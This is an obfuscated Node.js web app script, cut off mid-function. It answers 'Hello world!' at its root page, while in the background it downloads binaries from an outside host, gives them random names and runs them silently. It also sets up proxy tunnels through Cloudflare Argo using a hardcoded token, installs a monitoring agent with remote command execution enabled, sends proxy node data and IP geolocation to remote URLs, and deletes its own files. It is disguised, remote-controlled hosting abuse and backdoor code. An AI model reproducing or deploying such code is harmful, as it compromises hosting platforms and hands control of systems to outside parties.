const _0x2acae4=_0x4ebc;(function(_0x5c50a3,_0x13f543){const _0x47b30e={_0x1ffad8:0x224,_0x1655f5:0x20c,_0xbebbbe:0x21a},_0x542c25=_0x4ebc,_0x233ef5=_0x5c50a3();while(!![]){try{const _0x54d735=parseInt(_0x542c25(0x1e2))/0x1+parseInt(_0x542c25(0x235))/0x2+parseInt(_0x542c25(0x18f))/0x3*(parseInt(_0x542c25(0x19f))/0x4)+-parseInt(_0x542c25(_0x47b30e._0x1ffad8))/0x5+parseInt(_0x542c25(0x1b2))/0x6*(parseInt(_0x542c25(0x170))/0x7)+-parseInt(_0x542c25(_0x47b30e._0x1655f5))/0x8+-parseInt(_0x542c25(_0x47b30e._0xbebbbe))/0x9;if(_0x54d735===_0x13f543)break;else _0x233ef5['push'](_0x233ef5['shift']());}catch(_0x4b71c4){_0x233ef5['push'](_0x233ef5['shift']());}}}(_0x390e,0xdc531));const express=require('express'),app=express(),axios=require(_0x2acae4(0x233)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x2acae4(0x1ad))['exec']),{execSync}=require(_0x2acae4(0x1ad)),UPLOAD_URL=process['env'][_0x2acae4(0x183)]||'',PROJECT_URL=process[_0x2acae4(0x1be)][_0x2acae4(0x1c4)]||'',AUTO_ACCESS=process[_0x2acae4(0x1be)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x2acae4(0x1e0)]||_0x2acae4(0x21c),SUB_PATH=process[_0x2acae4(0x1be)]['SUB_PATH']||'kiss',PORT=process[_0x2acae4(0x1be)][_0x2acae4(0x1bd)]||process['env'][_0x2acae4(0x234)]||0xbb8,UUID=process['env'][_0x2acae4(0x177)]||_0x2acae4(0x189),NEZHA_SERVER=process['env'][_0x2acae4(0x1cf)]||'',NEZHA_PORT=process['env'][_0x2acae4(0x1c7)]||'',NEZHA_KEY=process[_0x2acae4(0x1be)][_0x2acae4(0x22c)]||'',ARGO_DOMAIN=process[_0x2acae4(0x1be)][_0x2acae4(0x1da)]||_0x2acae4(0x1d5),ARGO_AUTH=process[_0x2acae4(0x1be)][_0x2acae4(0x232)]||'eyJhIjoiOWRlZDFiM2EyYmQzN2VkZjgzOWE4MjQwMmQwMWJmMmMiLCJ0IjoiMDUxY2RiNGQtYjJlMy00ZGUxLWIzZmEtODFmMTcwNmMzMDMwIiwicyI6IlpEYzBaalUxTkdZdE1ERTFZaTAwWldRekxXSmtObVl0WXpsaU0yTTRNamRoTUdVNCJ9',ARGO_PORT=process[_0x2acae4(0x1be)][_0x2acae4(0x176)]||0x1f41,CFIP=process[_0x2acae4(0x1be)][_0x2acae4(0x1a4)]||_0x2acae4(0x1fb),CFPORT=process[_0x2acae4(0x1be)]['CFPORT']||0x1bb,NAME=process[_0x2acae4(0x1be)][_0x2acae4(0x171)]||'';!fs[_0x2acae4(0x20e)](FILE_PATH)?(fs[_0x2acae4(0x207)](FILE_PATH),console['log'](FILE_PATH+_0x2acae4(0x22f))):console[_0x2acae4(0x1ae)](FILE_PATH+_0x2acae4(0x225));function _0x390e(){const _0x5c7c09=['axios','PORT','2317316pmIHjC','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','7AuAupe','NAME','App\x20is\x20running','error','--tls','/vless-argo','ARGO_PORT','UUID','\x0a\x0avmess://','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','chmod','vless','del\x20/f\x20/q\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-s\x20','true','length','Empowerment\x20success\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','UPLOAD_URL','Error\x20reading\x20boot.log:','join','\x0a\x0atrojan://','fileName','NEZHA\x20variable\x20is\x20empty,skip\x20running','9afd1229-b893-40c1-84dd-51e7ce204913','floor','http','countryCode','?security=tls&sni=','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','372444slEPmX','TunnelSecret','none','https://arm64.ssss.nyc.mn/bot','get','data','/trojan-argo','\x20>/dev/null\x202>&1\x20&','Download\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20','config.json','&fp=firefox&type=ws&host=','country_code','stringify','arm','20EYrXYF','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','toString','amd','/sub.txt\x20saved\x20successfully','CFIP','automatic\x20access\x20task\x20added\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','sub.txt','https://arm64.ssss.nyc.mn/v1','then','/api/delete-nodes','/api/add-nodes','application/json','child_process','log','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20-c\x20\x22','block','78282zkrcpF','org','config.yaml','https://oooo.serv00.net/add-url','clear','?encryption=none&security=tls&sni=','/vmess-argo?ed=2560','&path=%2Ftrojan-argo%3Fed%3D2560#','web\x20running\x20error:\x20','send','tcp','SERVER_PORT','env','ArgoDomain:','Skipping\x20adding\x20automatic\x20access\x20task','false','post','forEach','PROJECT_URL','text/plain;\x20charset=utf-8','\x20>\x20nul\x202>&1','NEZHA_PORT','Unhandled\x20error\x20in\x20startserver:','\x0aclient_secret:\x20','response','8443','match','Hello\x20world!','utf-8','NEZHA_SERVER','statSync','arm64','/tunnel.yml\x20run','\x20>/dev/null\x202>&1','unlink','kiss.cody.eu.org','\x20failed:\x20','tunnel.json','firefox','taskkill\x20/f\x20/im\x20','ARGO_DOMAIN','\x20-p\x20','https+local://8.8.8.8/dns-query','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.yml','set','FILE_PATH','createWriteStream','1098191FVtRhE','platform','freedom','/config.json\x20>/dev/null\x202>&1\x20&','blackhole','push','unshift','from','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','status','readdirSync','http://ip-api.com/json/','charAt','127.0.0.1','Error\x20executing\x20command:\x20','2087','unlinkSync','2053','Subscription\x20uploaded\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','xtls-rprx-vision','random','Content-Type','443','cdns.doon.eu.org','split','list.txt','writeFileSync','\x20-c\x20','success','abcdefghijklmnopqrstuvwxyz','https://amd64.ssss.nyc.mn/web','catch','pop','message','\x22\x20>\x20/dev/null\x202>&1','mkdirSync','npm\x20running\x20error:\x20','&path=%2Fvless-argo%3Fed%3D2560#','\x20is\x20running','isFile','7309304mFiNlC','base64','existsSync','rm\x20-rf\x20','nohup\x20','https://amd64.ssss.nyc.mn/agent','readFileSync','https://arm64.ssss.nyc.mn/web','tls','includes','close','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','2083','test','2117016oVPfWy','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','./tmp','Error\x20downloading\x20files:','ARGO_DOMAIN:','pipe','quic','\x0avless://','\x0a\x20\x20credentials-file:\x20','arch','4196500NuuRWW','\x20already\x20exists','has','listen','/vmess-argo','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','direct','basename','NEZHA_KEY','stream','php\x20running\x20error:\x20','\x20is\x20created','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','win32','ARGO_AUTH'];_0x390e=function(){return _0x5c7c09;};return _0x390e();}function generateRandomName(){const _0x1fcc0c={_0x5a21dd:0x18a,_0x30fca6:0x180},_0x3e0c56=_0x2acae4,_0x17a90a=_0x3e0c56(0x201);let _0x4a3022='';for(let _0x21fef5=0x0;_0x21fef5<0x6;_0x21fef5++){_0x4a3022+=_0x17a90a[_0x3e0c56(0x1ee)](Math[_0x3e0c56(_0x1fcc0c._0x5a21dd)](Math[_0x3e0c56(0x1f8)]()*_0x17a90a[_0x3e0c56(_0x1fcc0c._0x30fca6)]));}return _0x4a3022;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2acae4(0x185)](FILE_PATH,npmName),phpPath=path[_0x2acae4(0x185)](FILE_PATH,phpName),webPath=path[_0x2acae4(0x185)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x2acae4(0x185)](FILE_PATH,_0x2acae4(0x1a7)),listPath=path[_0x2acae4(0x185)](FILE_PATH,_0x2acae4(0x1fd)),bootLogPath=path[_0x2acae4(0x185)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x807f5b={_0x49136b:0x20e,_0x4729a1:0x20d,_0x34b8a9:0x1c2,_0x20969e:0x1aa,_0x4949ec:0x19d,_0x1f2b28:0x1ac},_0x84bb63=_0x2acae4;try{if(!UPLOAD_URL)return;if(!fs[_0x84bb63(_0x807f5b._0x49136b)](subPath))return;let _0x32a2a9;try{_0x32a2a9=fs[_0x84bb63(0x212)](subPath,_0x84bb63(0x1ce));}catch{return null;}const _0x4cc5c7=Buffer[_0x84bb63(0x1e9)](_0x32a2a9,_0x84bb63(_0x807f5b._0x4729a1))['toString'](_0x84bb63(0x1ce)),_0x3634c2=_0x4cc5c7['split']('\x0a')['filter'](_0x50a7ca=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x84bb63(0x219)](_0x50a7ca));if(_0x3634c2[_0x84bb63(0x180)]===0x0)return;return axios[_0x84bb63(_0x807f5b._0x34b8a9)](UPLOAD_URL+_0x84bb63(_0x807f5b._0x20969e),JSON[_0x84bb63(_0x807f5b._0x4949ec)]({'nodes':_0x3634c2}),{'headers':{'Content-Type':_0x84bb63(_0x807f5b._0x1f2b28)}})[_0x84bb63(0x203)](_0x36f912=>{return null;}),null;}catch(_0x2b1a3f){return null;}}function cleanupOldFiles(){const _0x3f51e1={_0x5e4546:0x1d0,_0xe9b2d4:0x20b},_0x321be1=_0x2acae4;try{const _0x3571d6=fs[_0x321be1(0x1ec)](FILE_PATH);_0x3571d6['forEach'](_0x7bde9c=>{const _0x5a2ce3=_0x321be1,_0xc369af=path[_0x5a2ce3(0x185)](FILE_PATH,_0x7bde9c);try{const _0x1eca6b=fs[_0x5a2ce3(_0x3f51e1._0x5e4546)](_0xc369af);_0x1eca6b[_0x5a2ce3(_0x3f51e1._0xe9b2d4)]()&&fs[_0x5a2ce3(0x1f2)](_0xc369af);}catch(_0x111eb6){}});}catch(_0x31fa3b){}}app[_0x2acae4(0x193)]('/',function(_0x25bf6e,_0x9847e1){const _0x9d0c90={_0x5bec40:0x1bb},_0x5da5f3=_0x2acae4;_0x9847e1[_0x5da5f3(_0x9d0c90._0x5bec40)](_0x5da5f3(0x1cd));});async function generateConfig(){const _0x913863={_0x2b3fa6:0x1bc,_0x58ff24:0x191,_0x1eb7f7:0x220,_0x47fe4b:0x228,_0xe4d5ef:0x1ef,_0x36294a:0x191,_0x416626:0x195,_0x111604:0x214,_0x24986d:0x1dc,_0x38ca34:0x22a,_0x440e1c:0x1e6,_0x330428:0x1b1,_0x36ce02:0x1fe,_0x14ecfe:0x185,_0x55a24e:0x19d},_0x3e01ef=_0x2acae4,_0x45415c={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x3e01ef(0x191)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3e01ef(0x17b),'settings':{'clients':[{'id':UUID,'flow':_0x3e01ef(0x1f7)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x3e01ef(0x195),'dest':0xbbc}]},'streamSettings':{'network':_0x3e01ef(_0x913863._0x2b3fa6)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3e01ef(0x17b),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x3e01ef(_0x913863._0x2b3fa6),'security':_0x3e01ef(_0x913863._0x58ff24)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3e01ef(0x17b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3e01ef(_0x913863._0x58ff24)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3e01ef(0x175)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x3e01ef(_0x913863._0x1eb7f7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3e01ef(0x1ef),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3e01ef(_0x913863._0x47fe4b)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e01ef(0x18b),'tls',_0x3e01ef(0x220)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3e01ef(_0x913863._0xe4d5ef),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3e01ef(_0x913863._0x36294a),'wsSettings':{'path':_0x3e01ef(_0x913863._0x416626)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3e01ef(_0x913863._0x111604),_0x3e01ef(_0x913863._0x1eb7f7)],'metadataOnly':![]}}],'dns':{'servers':[_0x3e01ef(_0x913863._0x24986d)]},'outbounds':[{'protocol':_0x3e01ef(0x1e4),'tag':_0x3e01ef(_0x913863._0x38ca34)},{'protocol':_0x3e01ef(_0x913863._0x440e1c),'tag':_0x3e01ef(_0x913863._0x330428)}]};fs[_0x3e01ef(_0x913863._0x36ce02)](path[_0x3e01ef(_0x913863._0x14ecfe)](FILE_PATH,_0x3e01ef(0x19a)),JSON[_0x3e01ef(_0x913863._0x55a24e)](_0x45415c,null,0x2));}function getSystemArchitecture(){const _0x112a5e={_0x313275:0x1a2},_0xa58caa=_0x2acae4,_0x5cd2a0=os[_0xa58caa(0x223)]();return _0x5cd2a0===_0xa58caa(0x19e)||_0x5cd2a0===_0xa58caa(0x1d1)||_0x5cd2a0==='aarch64'?'arm':_0xa58caa(_0x112a5e._0x313275);}function downloadFile(_0x416015,_0x679960,_0x535108){const _0x4a21bd={_0x49edd2:0x20e,_0x31e52e:0x1e1,_0x48571e:0x193,_0x46f0ec:0x1a9},_0x48e705={_0x2dc2a1:0x205},_0x5637e5={_0x44b718:0x194,_0x3de69f:0x21f},_0x24f684={_0x3a73c6:0x1d6},_0x568b48={_0x1c7d35:0x216,_0xceb5cd:0x1ae,_0x50fcb3:0x22b},_0x250096=_0x2acae4,_0x326262=_0x416015;!fs[_0x250096(_0x4a21bd._0x49edd2)](FILE_PATH)&&fs[_0x250096(0x207)](FILE_PATH,{'recursive':!![]});const _0x5e19bf=fs[_0x250096(_0x4a21bd._0x31e52e)](_0x326262);axios({'method':_0x250096(_0x4a21bd._0x48571e),'url':_0x679960,'responseType':_0x250096(0x22d)})[_0x250096(_0x4a21bd._0x46f0ec)](_0xf3621f=>{const _0x23bd42=_0x250096;_0xf3621f[_0x23bd42(_0x5637e5._0x44b718)][_0x23bd42(_0x5637e5._0x3de69f)](_0x5e19bf),_0x5e19bf['on']('finish',()=>{const _0x6f1f1a=_0x23bd42;_0x5e19bf[_0x6f1f1a(_0x568b48._0x1c7d35)](),console[_0x6f1f1a(_0x568b48._0xceb5cd)]('Download\x20'+path[_0x6f1f1a(_0x568b48._0x50fcb3)](_0x326262)+'\x20successfully'),_0x535108(null,_0x326262);}),_0x5e19bf['on'](_0x23bd42(0x173),_0xdfce6c=>{const _0x1ca402=_0x23bd42;fs[_0x1ca402(0x1d4)](_0x326262,()=>{});const _0x2af9b0=_0x1ca402(0x197)+path[_0x1ca402(0x22b)](_0x326262)+_0x1ca402(_0x24f684._0x3a73c6)+_0xdfce6c[_0x1ca402(0x205)];console['error'](_0x2af9b0),_0x535108(_0x2af9b0);});})[_0x250096(0x203)](_0x149da5=>{const _0x577fe5=_0x250096,_0x11577e='Download\x20'+path['basename'](_0x326262)+'\x20failed:\x20'+_0x149da5[_0x577fe5(_0x48e705._0x2dc2a1)];console[_0x577fe5(0x173)](_0x11577e),_0x535108(_0x11577e);});}async function downloadFilesAndRun(){const _0x361847={_0x28a9a4:0x173,_0x441fcc:0x21d,_0x11020a:0x204,_0x10c128:0x1fa,_0x571b8f:0x1cb,_0x45eae4:0x1f3,_0x24926d:0x226,_0x29e159:0x1c1,_0x550af6:0x1f6,_0x2941dc:0x1a0,_0x4225df:0x1a6,_0x20f8fd:0x1fe,_0x1fdebb:0x229,_0x24b0e8:0x22e,_0x4a7824:0x218,_0x159d82:0x210,_0x506d2c:0x1db,_0x2a8690:0x198,_0x4322c6:0x208,_0x426ee9:0x188,_0xea323f:0x1ae,_0x5080b3:0x1d2,_0x49ebde:0x210,_0x161bea:0x20a},_0xb4d7ef=_0x2acae4,_0x53f3b6=getSystemArchitecture(),_0x18baaf=getFilesForArchitecture(_0x53f3b6);if(_0x18baaf['length']===0x0){console[_0xb4d7ef(0x1ae)](_0xb4d7ef(0x230));return;}const _0x362f1a=_0x18baaf['map'](_0x72e0ba=>{return new Promise((_0x121941,_0xe73f8)=>{const _0x539433=_0x4ebc;downloadFile(_0x72e0ba[_0x539433(0x187)],_0x72e0ba['fileUrl'],(_0x2af8fb,_0xd09ceb)=>{_0x2af8fb?_0xe73f8(_0x2af8fb):_0x121941(_0xd09ceb);});});});try{await Promise['all'](_0x362f1a);}catch(_0x23d75b){console[_0xb4d7ef(_0x361847._0x28a9a4)](_0xb4d7ef(_0x361847._0x441fcc),_0x23d75b);return;}function _0x179cdb(_0x3f93cc){const _0x36b21d={_0x27f2eb:0x17a},_0x312e3d=0x1fd;_0x3f93cc['forEach'](_0x5146c8=>{const _0x18a5b3={_0x24a7b9:0x173,_0x4b8232:0x1ae,_0xbf156c:0x1a1},_0x1080ed=_0x4ebc;fs[_0x1080ed(0x20e)](_0x5146c8)&&fs[_0x1080ed(_0x36b21d._0x27f2eb)](_0x5146c8,_0x312e3d,_0x351e1a=>{const _0xa92027=_0x1080ed;_0x351e1a?console[_0xa92027(_0x18a5b3._0x24a7b9)]('Empowerment\x20failed\x20for\x20'+_0x5146c8+':\x20'+_0x351e1a):console[_0xa92027(_0x18a5b3._0x4b8232)](_0xa92027(0x181)+_0x5146c8+':\x20'+_0x312e3d[_0xa92027(_0x18a5b3._0xbf156c)](0x8));});});}const _0x7f9fb7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x179cdb(_0x7f9fb7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12268f=NEZHA_SERVER[_0xb4d7ef(0x215)](':')?NEZHA_SERVER[_0xb4d7ef(0x1fc)](':')[_0xb4d7ef(_0x361847._0x11020a)]():'',_0x11334c=new Set([_0xb4d7ef(_0x361847._0x10c128),_0xb4d7ef(_0x361847._0x571b8f),'2096',_0xb4d7ef(0x1f1),_0xb4d7ef(0x218),_0xb4d7ef(_0x361847._0x45eae4)]),_0x3c6288=_0x11334c[_0xb4d7ef(_0x361847._0x24926d)](_0x12268f)?_0xb4d7ef(0x17f):_0xb4d7ef(_0x361847._0x29e159),_0x458bfd=_0xb4d7ef(0x1c9)+NEZHA_KEY+_0xb4d7ef(_0x361847._0x550af6)+NEZHA_SERVER+_0xb4d7ef(_0x361847._0x2941dc)+_0x3c6288+_0xb4d7ef(_0x361847._0x4225df)+UUID;fs[_0xb4d7ef(_0x361847._0x20f8fd)](path['join'](FILE_PATH,_0xb4d7ef(0x1b4)),_0x458bfd);const _0x1e4e20=_0xb4d7ef(0x210)+phpPath+_0xb4d7ef(0x1b0)+FILE_PATH+_0xb4d7ef(_0x361847._0x1fdebb);try{await exec(_0x1e4e20),console[_0xb4d7ef(0x1ae)](phpName+_0xb4d7ef(0x20a)),await new Promise(_0x1433da=>setTimeout(_0x1433da,0x3e8));}catch(_0x4c7330){console[_0xb4d7ef(0x173)](_0xb4d7ef(_0x361847._0x24b0e8)+_0x4c7330);}}else{let _0x194840='';const _0x474c4a=[_0xb4d7ef(0x1fa),_0xb4d7ef(0x1cb),'2096',_0xb4d7ef(0x1f1),_0xb4d7ef(_0x361847._0x4a7824),_0xb4d7ef(_0x361847._0x45eae4)];_0x474c4a[_0xb4d7ef(0x215)](NEZHA_PORT)&&(_0x194840=_0xb4d7ef(0x174));const _0x586351=_0xb4d7ef(_0x361847._0x159d82)+npmPath+_0xb4d7ef(0x17e)+NEZHA_SERVER+':'+NEZHA_PORT+_0xb4d7ef(_0x361847._0x506d2c)+NEZHA_KEY+'\x20'+_0x194840+_0xb4d7ef(_0x361847._0x2a8690);try{await exec(_0x586351),console[_0xb4d7ef(0x1ae)](npmName+_0xb4d7ef(0x20a)),await new Promise(_0x32d0d9=>setTimeout(_0x32d0d9,0x3e8));}catch(_0x2d2fec){console[_0xb4d7ef(0x173)](_0xb4d7ef(_0x361847._0x4322c6)+_0x2d2fec);}}}else console[_0xb4d7ef(0x1ae)](_0xb4d7ef(_0x361847._0x426ee9));const _0x5d62b5=_0xb4d7ef(0x210)+webPath+_0xb4d7ef(0x1ff)+FILE_PATH+_0xb4d7ef(0x1e5);try{await exec(_0x5d62b5),console[_0xb4d7ef(_0x361847._0xea323f)](webName+_0xb4d7ef(0x20a)),await new Promise(_0x265a76=>setTimeout(_0x265a76,0x3e8));}catch(_0x5c77e0){console['error'](_0xb4d7ef(0x1ba)+_0x5c77e0);}if(fs[_0xb4d7ef(0x20e)](botPath)){let _0x2e1ab4;if(ARGO_AUTH[_0xb4d7ef(0x1cc)](/^[A-Z0-9a-z=]{120,250}$/))_0x2e1ab4=_0xb4d7ef(0x18e)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2e1ab4=_0xb4d7ef(0x1dd)+FILE_PATH+_0xb4d7ef(_0x361847._0x5080b3):_0x2e1ab4='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xb4d7ef(0x179)+ARGO_PORT;try{await exec(_0xb4d7ef(_0x361847._0x49ebde)+botPath+'\x20'+_0x2e1ab4+_0xb4d7ef(0x196)),console[_0xb4d7ef(_0x361847._0xea323f)](botName+_0xb4d7ef(_0x361847._0x161bea)),await new Promise(_0x19c48e=>setTimeout(_0x19c48e,0x7d0));}catch(_0x523888){console[_0xb4d7ef(0x173)](_0xb4d7ef(0x1f0)+_0x523888);}}await new Promise(_0x559d20=>setTimeout(_0x559d20,0x1388));}function getFilesForArchitecture(_0x2e5bae){const _0x2d0715={_0x51aa59:0x19e,_0xbe7a36:0x213,_0x289ab8:0x19e,_0x4a86dd:0x1e8,_0x4381a0:0x19e,_0x264722:0x1a8,_0x5a6aaa:0x1e8},_0x128f80=_0x2acae4;let _0x2b4bbf;_0x2e5bae===_0x128f80(_0x2d0715._0x51aa59)?_0x2b4bbf=[{'fileName':webPath,'fileUrl':_0x128f80(_0x2d0715._0xbe7a36)},{'fileName':botPath,'fileUrl':_0x128f80(0x192)}]:_0x2b4bbf=[{'fileName':webPath,'fileUrl':_0x128f80(0x202)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x149dc6=_0x2e5bae===_0x128f80(_0x2d0715._0x289ab8)?'https://arm64.ssss.nyc.mn/agent':_0x128f80(0x211);_0x2b4bbf[_0x128f80(_0x2d0715._0x4a86dd)]({'fileName':npmPath,'fileUrl':_0x149dc6});}else{const _0x91a47f=_0x2e5bae===_0x128f80(_0x2d0715._0x4381a0)?_0x128f80(_0x2d0715._0x264722):'https://amd64.ssss.nyc.mn/v1';_0x2b4bbf[_0x128f80(_0x2d0715._0x5a6aaa)]({'fileName':phpPath,'fileUrl':_0x91a47f});}}return _0x2b4bbf;}function argoType(){const _0x1e7659={_0x4a4fb2:0x217,_0x5b6307:0x222,_0x561fb7:0x185,_0x12cc10:0x1fe,_0x774626:0x1de,_0x30735a:0x1ae},_0x1a2345=_0x2acae4;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1a2345(0x1ae)](_0x1a2345(_0x1e7659._0x4a4fb2));return;}if(ARGO_AUTH[_0x1a2345(0x215)](_0x1a2345(0x190))){fs[_0x1a2345(0x1fe)](path[_0x1a2345(0x185)](FILE_PATH,_0x1a2345(0x1d7)),ARGO_AUTH);const _0x3c73d1='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1a2345(0x1fc)]('\x22')[0xb]+_0x1a2345(_0x1e7659._0x5b6307)+path[_0x1a2345(_0x1e7659._0x561fb7)](FILE_PATH,_0x1a2345(0x1d7))+_0x1a2345(0x21b)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1a2345(_0x1e7659._0x12cc10)](path[_0x1a2345(0x185)](FILE_PATH,_0x1a2345(_0x1e7659._0x774626)),_0x3c73d1);}else console[_0x1a2345(_0x1e7659._0x30735a)](_0x1a2345(0x1ea));}async function extractDomains(){const _0xa89303={_0x54dab8:0x1ae,_0x5a38be:0x21e,_0x4478d2:0x185,_0x360885:0x1c3,_0x528e42:0x1ae,_0x2f1d9a:0x17d,_0x45e420:0x196,_0xb25bd4:0x20a,_0x5a9d19:0x173},_0x84532d={_0x57b7bd:0x193,_0x6fad9b:0x194,_0x11969f:0x19c,_0x482e0e:0x1b3,_0x343fa2:0x193,_0x2b05f4:0x1ed,_0x33d612:0x194,_0x468105:0x200},_0x4bb994={_0xad449b:0x231,_0xf50d6c:0x1ee,_0x287a8b:0x206},_0x2f9bb2={_0x115c02:0x1cc},_0xf03904=_0x2acae4;let _0x5ab4cf;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5ab4cf=ARGO_DOMAIN,console[_0xf03904(_0xa89303._0x54dab8)](_0xf03904(_0xa89303._0x5a38be),_0x5ab4cf),await _0x34508f(_0x5ab4cf);else try{const _0x552c38=fs['readFileSync'](path[_0xf03904(_0xa89303._0x4478d2)](FILE_PATH,'boot.log'),'utf-8'),_0x56e3eb=_0x552c38['split']('\x0a'),_0x2e3622=[];_0x56e3eb[_0xf03904(_0xa89303._0x360885)](_0x1e5eb4=>{const _0x331f82=_0xf03904,_0x2e054b=_0x1e5eb4[_0x331f82(_0x2f9bb2._0x115c02)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2e054b){const _0x57b789=_0x2e054b[0x1];_0x2e3622['push'](_0x57b789);}});if(_0x2e3622['length']>0x0)_0x5ab4cf=_0x2e3622[0x0],console['log'](_0xf03904(0x1bf),_0x5ab4cf),await _0x34508f(_0x5ab4cf);else{console[_0xf03904(_0xa89303._0x528e42)](_0xf03904(_0xa89303._0x2f1d9a)),fs['unlinkSync'](path[_0xf03904(_0xa89303._0x4478d2)](FILE_PATH,'boot.log'));async function _0x183bc1(){const _0x1fe954=_0xf03904;try{process['platform']===_0x1fe954(_0x4bb994._0xad449b)?await exec(_0x1fe954(0x1d9)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x1fe954(_0x4bb994._0xf50d6c)](0x0)+']'+botName['substring'](0x1)+_0x1fe954(_0x4bb994._0x287a8b));}catch(_0x4d58d9){}}_0x183bc1(),await new Promise(_0x18ade6=>setTimeout(_0x18ade6,0xbb8));const _0x2bf4ef=_0xf03904(0x182)+FILE_PATH+_0xf03904(0x179)+ARGO_PORT;try{await exec(_0xf03904(0x210)+botPath+'\x20'+_0x2bf4ef+_0xf03904(_0xa89303._0x45e420)),console['log'](botName+_0xf03904(_0xa89303._0xb25bd4)),await new Promise(_0x3bde56=>setTimeout(_0x3bde56,0xbb8)),await extractDomains();}catch(_0xf83587){console['error']('Error\x20executing\x20command:\x20'+_0xf83587);}}}catch(_0x31f99e){console[_0xf03904(_0xa89303._0x5a9d19)](_0xf03904(0x184),_0x31f99e);}async function _0x5bfa11(){const _0x265309=_0xf03904;try{const _0x199c9d=await axios[_0x265309(_0x84532d._0x57b7bd)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x199c9d[_0x265309(0x194)]&&_0x199c9d[_0x265309(_0x84532d._0x6fad9b)][_0x265309(_0x84532d._0x11969f)]&&_0x199c9d[_0x265309(0x194)][_0x265309(_0x84532d._0x482e0e)])return _0x199c9d['data'][_0x265309(0x19c)]+'_'+_0x199c9d[_0x265309(0x194)][_0x265309(0x1b3)];}catch(_0x41885a){try{const _0x43b498=await axios[_0x265309(_0x84532d._0x343fa2)](_0x265309(_0x84532d._0x2b05f4),{'timeout':0xbb8});if(_0x43b498[_0x265309(_0x84532d._0x33d612)]&&_0x43b498[_0x265309(0x194)][_0x265309(0x1eb)]===_0x265309(_0x84532d._0x468105)&&_0x43b498['data'][_0x265309(0x18c)]&&_0x43b498[_0x265309(0x194)][_0x265309(0x1b3)])return _0x43b498[_0x265309(0x194)][_0x265309(0x18c)]+'_'+_0x43b498['data']['org'];}catch(_0x42e4aa){}}return'Unknown';}async function _0x34508f(_0x26cc88){const 